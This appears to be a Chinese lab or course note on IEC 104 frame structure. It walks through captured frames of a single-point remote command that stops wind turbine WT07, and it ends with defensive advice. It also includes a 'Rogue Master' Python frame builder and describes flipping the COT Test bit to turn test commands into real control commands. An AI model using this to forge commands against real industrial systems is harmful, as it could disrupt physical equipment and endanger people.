## 一句话概括

定义：IEC 104 一帧分两段。APCI（6 字节：起始符 + 长度 + 控制域）管"这是 I/S/U 哪一种帧、序号对不对"，ASDU（应用数据）管"这是什么信息、作用在哪个点、原因是什么"。遥控命令就在 I 帧的 ASDU 里。

## 原理

### 1. 整体结构

正文引用 `../_assets/iec104帧.svg`。

```text
┌────────── APCI（6 字节）──────────┐┌──────── ASDU（可变）────────┐
│ 起始符 │ 长度 │    控制域（4 字节）  ││ 类型标识 │ VSQ │ COT │ OA │ CA │ 信息对象… │
│  0x68  │  N   │  I / S / U 三种格式  ││  1 字节  │1字节│1字节│1字节│2字节│  可变     │
└────────┴──────┴────────────────────┘└──────────┴─────┴─────┴─────┴─────┴───────────┘
                   ▲                              ▲
            决定帧的种类与序号              决定业务语义（含遥控）
```

| 字段 | 长度 | 说明 |
|---|---|---|
| 起始符 | 1 | 固定 `0x68`，IEC 104 每帧都以此开头（很好认） |
| 长度 | 1 | 从控制域第一个字节起算的字节数 = 4 + ASDU 长度 |
| 控制域 | 4 | I/S/U 三种格式，见下 |
| TypeID | 1 | 类型标识（`0x2D` = 单点遥控） |
| VSQ | 1 | 可变结构限定词：SQ 位 + 对象个数 |
| COT | 1 | 传送原因（含 Test 位） |
| OA | 1 | 源发站地址（Originator Address），通常 0 |
| CA | 2 | 公共地址（Common Address）= 厂站地址，小端 |
| IOA | 3 | 信息对象地址（点号），小端 |
| 信息元素 | 1~N | 具体值（遥控是 SCO 1 字节；遥测是数值 + 品质） |

> 字节序陷阱：IEC 104 的多字节字段（CA、IOA）都是小端。这是本篇最容易踩的坑，见 `抓包分析.md` 末尾的实测对照。

### 2. 控制域：I / S / U 三种格式

#### I 帧（Information）：唯一承载 ASDU 的帧

```text
字节0 字节1 │ 字节2 字节3
 发送序号<<1 │ 接收序号<<1
   （低 15 位有效，bit0 固定 0 表示 I 帧）
```

- 字节 0-1：本端已发出的 I 帧计数，左移 1 位存放（bit0 留作格式标记）。
- 字节 2-3：本端已收到的 I 帧计数，同样左移 1 位。
- 所以控制域 `02 00 02 00` 的意思是"我发过 1 帧（0x0002>>1），我收到过 1 帧（0x0002>>1）"。

成因：远动要按 ASDU 个数单独对账，序号因此按 I 帧计数；左移一位存放，是为腾出最低位作格式标记。

#### S 帧（Supervisory）：只确认，不带数据

```text
字节0 = 0x01 │ 字节1 = 0x00 │ 字节2-3 = 接收序号<<1
```

#### U 帧（Unnumbered）：链路管理

```text
字节0 = 功能码 │ 字节1-3 = 0x000000
```

六个功能码（低两位固定 `11`，其余位恰好一位为 `1`）：

| 十六进制 | 二进制 | 名称 | 作用 |
|---|---|---|---|
| `0x07` | `0000 0111` | STARTDT act | 请求启动数据传输 |
| `0x0B` | `0000 1011` | STARTDT con | 确认启动 |
| `0x13` | `0001 0011` | STOPDT act | 请求停止数据传输 |
| `0x23` | `0010 0011` | STOPDT con | 确认停止 |
| `0x43` | `0100 0011` | TESTFR act | 测试链路（保活） |
| `0x83` | `1000 0011` | TESTFR con | 确认测试 |

U 帧的完整帧长固定 6 字节：

```text
6804 07000000      STARTDT act
6804 0b000000      STARTDT con
```

`68` + 长度 `04`（控制域 4 字节，无 ASDU）+ 控制域 4 字节。

### 3. ASDU 逐字段

#### 类型标识 TypeID（1 字节）

见 `远动四遥.md` 的类型表。遥控用 `0x2D`（C_SC_NA_1 单点遥控）。

#### VSQ（1 字节）：可变结构限定词

```text
bit7 = SQ（Structure Qualifier）
        0 = 地址不连续，每个对象前都带 3 字节 IOA
        1 = 地址连续，只写第一个 IOA，后续按 +1 递增
bit6..0 = 信息对象个数（0-127）
```

实测帧的 VSQ = `0x01` → SQ=0、1 个对象。一条遥控命令只操作一个点，所以 VSQ 固定是 `01`。

#### COT（1 字节）：传送原因，攻击链的关键位

```text
bit7 = T   （Test，测试标志）   ← 攻击链就改这一位
bit6 = P/N （0 肯定 / 1 否定）
bit5..0 = 传送原因值（0-63）
```

| COT 值 | 名称 | 含义 |
|---|---|---|
| 1 | 周期/循环 | 周期上送的遥测 |
| 3 | 突发 | 变化立即上送（遥信变位常用） |
| 5 | 请求/被请求 | 响应总召唤 |
| 6 | 激活 activation | 命令下发 |
| 7 | 激活确认 ACT_CON | 对方收到并接受 |
| 8 | 停止激活 | 撤销 |
| 9 | 停止激活确认 | — |
| 10 | 激活终止 ACT_TERM | 命令执行完毕 |
| 20 | 响应站召唤 | — |
| 44-47 | 未知类型/原因/地址 | 异常反馈 |

实测算术：

```text
0x86 = 1000 0110 → Test=1, P/N=0, COT=6（激活）        ← 维护测试通道发的
0x06 = 0000 0110 → Test=0, P/N=0, COT=6（激活）        ← 攻击者改成的正式控制
0x07 = 0000 0111 → COT=7（激活确认）
0x0a = 0000 1010 → COT=10（激活终止）
```

`0x86` 与 `0x06` 只差最高位一个比特，这就是"测试通道"与"生产控制"的全部区别。

#### OA / CA

| 字段 | 含义 |
|---|---|
| OA（源发站地址，1 字节） | 标识"谁发起的"，多用于多主站/级联场景，实测为 `0x00` |
| CA（公共地址，2 字节，小端） | 厂站地址，实测为 `03 00` = 3。每个厂站有独立 CA，命令发错 CA 会被忽略或报"未知公共地址" |

#### IOA（3 字节，小端）：点号

```text
实测字节序列  f8 28 00
小端还原     0x00 28 f8 = 10488
含义         该 RTU 的第 10488 号信息对象 = WT07 的停机命令点
```

IOA 是 IEC 104 里的"点号"，等价于 Modbus 里的寄存器地址。打错点号，命令就落到别的设备上或被拒。

#### 信息元素：SCO（单点遥控）

遥控的信息元素只有 1 字节，叫 SCO（Single Command）：

```text
bit7    = S/E  （Select/Execute）  1 = 选择，0 = 执行
bit6    = QU   （限定词，通常 0）
bit5..1 = 保留
bit0    = SCS  （Single Command State）  0 = 分/停，1 = 合/启
```

实测：

```text
Select  → SCO = 0x80 = 1000 0000 → S/E=1（选择）、SCS=0（停）
Execute → SCO = 0x00 = 0000 0000 → S/E=0（执行）、SCS=0（停）
```

SBO（Select Before Operate，先选后控）就体现在 SCO 的 bit7 上。同一个连接里先发 `0x80` 再发 `0x00`，才是完整的一次遥控。

## 报文/字段对照：一次遥控的五个 ASDU

实测 WT07（IOA=10488），ASDU 全部 10 字节：

| 方向 | 完整帧（十六进制） | COT | SCO | 说明 |
|---|---|---|---|---|
| 主→从 | `680e 00000000 2d0186000300f8280080` | `0x86` 激活+Test | `0x80` 选择 | Select |
| 从→主 | `680e 00000002 2d0107000300f8280080` | `0x07` 激活确认 | `0x80` 回显 | ACT_CON |
| 主→从 | `680e 02000200 2d0186000300f8280000` | `0x86` 激活+Test | `0x00` 执行 | Execute |
| 从→主 | `680e 02000400 2d0107000300f8280000` | `0x07` 激活确认 | `0x00` 回显 | ACT_CON |
| 从→主 | `680e 04000400 2d010a000300f8280000` | `0x0a` 激活终止 | `0x00` | ACT_TERM |

（控制域里 4 字节的序号随帧递增，见 `抓包分析.md` 的完整时序表。）

命令落地点由三样东西组合而成：

```text
CA = 3        发给哪个厂站
IOA = 10488   动哪个点（WT07 停机）
SCS = 0       动成什么样（停）
```

三者任一错，命令都不会产生预期影响。

## 在攻击链里的位置

山区链的 Rogue Master 脚本就是按上面的结构手拼字节数组：

```python
# 手册脚本的核心（结构清晰版）
def c_sc_na_1(ca, ioa, select, send_seq, recv_seq, scs=0, test=False):
    asdu  = bytes([45, 1, cot_byte(6, test), 0])          # TypeID=45, VSQ=1, COT, OA=0
    asdu += struct.pack("<H", ca) + ioa_bytes(ioa)         # CA 小端 + IOA
    asdu += bytes([sco_byte(select, scs)])                 # SCO
    return bytes([0x68, 4 + len(asdu)]) + control_field(send_seq, recv_seq) + asdu
```

三段拼装正对应本篇结构：APCI（0x68 + 长度 + 控制域）+ ASDU 头四字段 + 信息对象（IOA + SCO）。

而脚本里的 `cot_byte(6, test)` 就是那个开关：

```python
def cot_byte(cot=6, test=False, pn=False):
    return ((1 if test else 0) << 7) | ((1 if pn else 0) << 6) | (cot & 0x3F)
```

`test=False` 让 COT 从 `0x86` 变成 `0x06`，测试命令就变成了正式控制命令。

## 安全视角

- 协议本身不区分"测试"与"生产"，靠实现来区分：规范定义了 Test 位，但"收到 Test=1 该不该落地"取决于实现，这是 IEC 104 最典型的实现缺陷类型。防护上必须在转发组件里显式拒绝 `Test=1` 的命令进入生产链路，只校验"有没有 ticket"不够。
- 一帧遥控只有 12~16 字节，CA / IOA / SCS 决定"打谁、打哪、打成什么"，改几个字节就能改变物理世界。链路层的访问控制（谁能连 2404）比报文校验更根本。
- 长度字段是解析器的主要攻击面。APCI 长度字段必须与后续 ASDU 实际长度一致，长度不一致或 ASDU 过短的畸形帧会触发解析异常，是链路异常类攻击的常见载体。
- 序号必须实时校验。发送序号/接收序号被扰动会导致链路复位（见 `链路异常.md`），"序号漂移"既是故障现象，也是攻击痕迹。
